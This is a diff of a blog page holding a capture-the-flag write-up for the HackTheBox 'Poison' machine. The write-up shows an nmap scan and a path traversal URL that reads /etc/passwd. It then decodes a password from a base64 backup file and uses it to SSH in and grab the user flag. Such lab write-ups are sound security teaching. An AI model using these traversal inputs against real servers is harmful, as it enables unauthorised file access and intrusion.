@@ -71,7 +71,7 @@
       <div id="sponsor">
 	
 	
-		<a href="http://join.robinhood.com/dans135" target="_blank" rel="noopener">💸 Join Robinhood today and get a free stock! 💸</a>
+		<a href="https://secure.backblaze.com/r/01ccbt" target="_blank" rel="noopener">💾 Sign up for BackBlaze today and get 1 month of unlimited online backup space for free! 💾</a>
 	
 	<br>
 	<span class="about"><a href="https://danthesalmon.com/sponsors">About these ads</a></span>
@@ -88,16 +88,16 @@
 <p><img src="../images/poison-overview.png" alt="poison-overview"></p>
 <h3 id="steps">Steps</h3>
 <p>As with all pentests, we must start with recon. Let&rsquo;s start by port scanning the box.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nmap -sC -sV -oA hackthebox-poison 10.10.10.84
-</code></pre></div><p>and the results show:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nmap -sC -sV -oA hackthebox-poison 10.10.10.84
+</span></span></code></pre></div><p>and the results show:</p>
 <p><img src="../images/poison-scan.png" alt="poison-scan"></p>
 <p>So we can see this box only has SSH and HTTP running. Let&rsquo;s see what&rsquo;s running on port 80.</p>
 <p><img src="../images/poison-home.png" alt="poison-home"></p>
 <p>Here there&rsquo;s a list of file names and a textbox. If we enter any of the filenames into the text box, the page seems to read the contents of the file and output it to the screen. We&rsquo;re expected to input a file from the list of file names, but let&rsquo;s see what happens if we try to leave the current directory.</p>
 <p>In the browser, try to navigate to</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#960050;background-color:#1e0010">h</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">p</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#ae81ff">10.10</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#ae81ff">10.84</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">b</span><span style="color:#960050;background-color:#1e0010">r</span><span style="color:#960050;background-color:#1e0010">o</span><span style="color:#960050;background-color:#1e0010">w</span><span style="color:#960050;background-color:#1e0010">s</span><span style="color:#960050;background-color:#1e0010">e</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">p</span><span style="color:#960050;background-color:#1e0010">h</span><span style="color:#960050;background-color:#1e0010">p</span><span style="color:#960050;background-color:#1e0010">?</span><span style="color:#960050;background-color:#1e0010">f</span><span style="color:#960050;background-color:#1e0010">i</span><span style="color:#960050;background-color:#1e0010">l</span><span style="color:#960050;background-color:#1e0010">e</span><span style="color:#960050;background-color:#1e0010">=</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">e</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">c</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">p</span><span style="color:#960050;background-color:#1e0010">a</span><span style="color:#960050;background-color:#1e0010">s</span><span style="color:#960050;background-color:#1e0010">s</span><span style="color:#960050;background-color:#1e0010">w</span><span style="color:#960050;background-color:#1e0010">d</span>
-</code></pre></div><p>and we should get the output</p>
-<pre><code># $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">http:</span><span style="color:#75715e">//10.10.10.84/browse.php?file=../../../../../../../../../etc/passwd
+</span></span></span></code></pre></div><p>and we should get the output</p>
+<pre tabindex="0"><code># $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $
 #
 root:*:0:0:Charlie &amp;:/root:/bin/csh
 toor:*:0:0:Bourne-again Superuser:/root:
@@ -131,37 +131,37 @@ cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin
 charix:*:1001:1001:charix:/home/charix:/bin/csh
 </code></pre><p>Nice! The page is vulnerable to a <a href="https://www.owasp.org/index.php/Path_Traversal">Path Traversal attack</a>. In the output we can see that there are 2 users that have shell access on the box: <code>charix</code> and <code>root</code>.</p>
 <p>This is good information, but not enough to get access into the box. Let&rsquo;s circle back to the files listed on the home page</p>
-<pre><code>ini.php
+<pre tabindex="0"><code>ini.php
 info.php
 listfiles.php
 phpinfo.php
 </code></pre><p>Entering <code>listfiles.php</code> into the box on the home page lists the files we already know about, but also an unknown file with an interesting name - <code>pwdbackup.txt</code>.</p>
 <p>Well let&rsquo;s check that one out!</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#960050;background-color:#1e0010">h</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">p</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#ae81ff">10.10</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#ae81ff">10.84</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">b</span><span style="color:#960050;background-color:#1e0010">r</span><span style="color:#960050;background-color:#1e0010">o</span><span style="color:#960050;background-color:#1e0010">w</span><span style="color:#960050;background-color:#1e0010">s</span><span style="color:#960050;background-color:#1e0010">e</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">p</span><span style="color:#960050;background-color:#1e0010">h</span><span style="color:#960050;background-color:#1e0010">p</span><span style="color:#960050;background-color:#1e0010">?</span><span style="color:#960050;background-color:#1e0010">f</span><span style="color:#960050;background-color:#1e0010">i</span><span style="color:#960050;background-color:#1e0010">l</span><span style="color:#960050;background-color:#1e0010">e</span><span style="color:#960050;background-color:#1e0010">=</span><span style="color:#960050;background-color:#1e0010">p</span><span style="color:#960050;background-color:#1e0010">w</span><span style="color:#960050;background-color:#1e0010">d</span><span style="color:#960050;background-color:#1e0010">b</span><span style="color:#960050;background-color:#1e0010">a</span><span style="color:#960050;background-color:#1e0010">c</span><span style="color:#960050;background-color:#1e0010">k</span><span style="color:#960050;background-color:#1e0010">u</span><span style="color:#960050;background-color:#1e0010">p</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">x</span><span style="color:#960050;background-color:#1e0010">t</span>
-</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-markdown" data-lang="markdown">This password is secure, it&#39;s encoded atleast 13 times.. what could go wrong really..
-
-Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU
-bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS
-bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW
-M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs
-WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy
-eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G
-WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw
-MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa
-T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k
-WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk
-WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0
-NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT
-Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz
-WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW
-VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO
-Ukd4RVdub3dPVU5uUFQwSwo=
-</code></pre></div><p>We can tell it&rsquo;s probably Base64 encoded based on the fact that it ends with an equal sign. Since the hint tells us it&rsquo;s encoded 13x, just run it through a Base64 decoder 13x. After all that we get:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-markdown" data-lang="markdown">Charix!2#4%6&amp;8(0
-</code></pre></div><p>Sure looks like a password to me! Verify this by SSH&rsquo;ing into the box with this password:</p>
-<pre><code>ssh charix@10.10.10.84
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">http:</span><span style="color:#75715e">//10.10.10.84/browse.php?file=pwdbackup.txt
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-markdown" data-lang="markdown"><span style="display:flex;"><span>This password is secure, it&#39;s encoded atleast 13 times.. what could go wrong really..
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU
+</span></span><span style="display:flex;"><span>bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS
+</span></span><span style="display:flex;"><span>bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW
+</span></span><span style="display:flex;"><span>M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs
+</span></span><span style="display:flex;"><span>WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy
+</span></span><span style="display:flex;"><span>eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G
+</span></span><span style="display:flex;"><span>WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw
+</span></span><span style="display:flex;"><span>MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa
+</span></span><span style="display:flex;"><span>T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k
+</span></span><span style="display:flex;"><span>WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk
+</span></span><span style="display:flex;"><span>WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0
+</span></span><span style="display:flex;"><span>NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT
+</span></span><span style="display:flex;"><span>Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz
+</span></span><span style="display:flex;"><span>WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW
+</span></span><span style="display:flex;"><span>VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO
+</span></span><span style="display:flex;"><span>Ukd4RVdub3dPVU5uUFQwSwo=
+</span></span></code></pre></div><p>We can tell it&rsquo;s probably Base64 encoded based on the fact that it ends with an equal sign. Since the hint tells us it&rsquo;s encoded 13x, just run it through a Base64 decoder 13x. After all that we get:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-markdown" data-lang="markdown"><span style="display:flex;"><span>Charix!2#4%6<span style="color:#960050;background-color:#1e0010">&amp;</span>8(0
+</span></span></code></pre></div><p>Sure looks like a password to me! Verify this by SSH&rsquo;ing into the box with this password:</p>
+<pre tabindex="0"><code>ssh charix@10.10.10.84
 </code></pre><p>and of course grab the flag to claim</p>
-<pre><code>$ cat ~/user.txt
+<pre tabindex="0"><code>$ cat ~/user.txt
 eaacdfb2d141b72a589233063604209c
 </code></pre><p>Root escalation will be left as an excercise to the reader (because I didn&rsquo;t have time to do it before the box was retired).</p>
 
@@ -178,21 +178,6 @@ eaacdfb2d141b72a589233063604209c
       </p>
 
       
-<div id="disqus_thread"></div>
-<script type="text/javascript">
-  var disqus_config = function () {
-    this.page.url = "https:\/\/danthesalmon.com";
-    this.page.identifier = "\/hackthebox-poison\/";
-  };
-
-  (function() { 
-    var d = document, s = d.createElement('script');
-    s.src = "https://salmonroll.disqus.com/embed.js";
-    s.setAttribute('data-timestamp', +new Date());
-    (d.head || d.body).appendChild(s);
-  })();
-</script>
-
 
     </div>
   </div>
@@ -208,7 +193,7 @@ eaacdfb2d141b72a589233063604209c
 </nav>
 
           <small>
-            Copyright &#169; 2020<br>
+            Copyright &#169; 2022<br>
             Powered by <a href="http://gohugo.io/" target="_blank">Hugo</a> &amp; <a href="https://github.com/sa7mon/hugo-theme-pixyll" target="_blank">Pixyll</a>
           </small>
         </div>
